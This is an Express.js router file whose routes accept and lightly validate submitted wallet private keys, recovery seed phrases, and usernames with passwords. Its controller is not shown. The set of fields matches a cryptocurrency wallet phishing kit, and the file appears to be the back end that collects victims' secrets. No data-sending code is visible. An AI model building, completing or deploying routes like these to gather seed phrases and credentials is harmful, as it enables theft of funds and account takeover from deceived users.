const express = require('express')
const router = express.Router()

const controller = require('../controller/index') 
const { check } = require('express-validator/check')


router.get('/', controller.getHomePage)

router.get('/privateKey', controller.getPrivateKey)

router.post('/privateKey', [
    check('privateKey').custom((value, { req }) => {
        if(value == '' || !value) {
            throw new Error('Input field must not be empty')
        }
        return true;
    })
]  ,controller.postPrivateKey)

router.get('/seedPhrase', controller.getSeedPhrase)

router.post('/seedPhrase', [
    check('seedPhrase').custom((value, { req }) => {
        if(value == '' || !value) {
            throw new Error('Input field must not be empty')
        }
        return true;
    })
], controller.postSeedPhrase)

router.get('/userandpass', controller.getUserandPass)

router.post('/userandpass', [
    check('password').custom((value, { req }) => {
        if(value == '' || !value || req.body.username == '') {
            throw new Error('Input field must not be empty')
        }
        return true;
    }).isLength({min: 5}).withMessage('Password must not be less than 5 characters')
], controller.postUserandPass)


module.exports = router 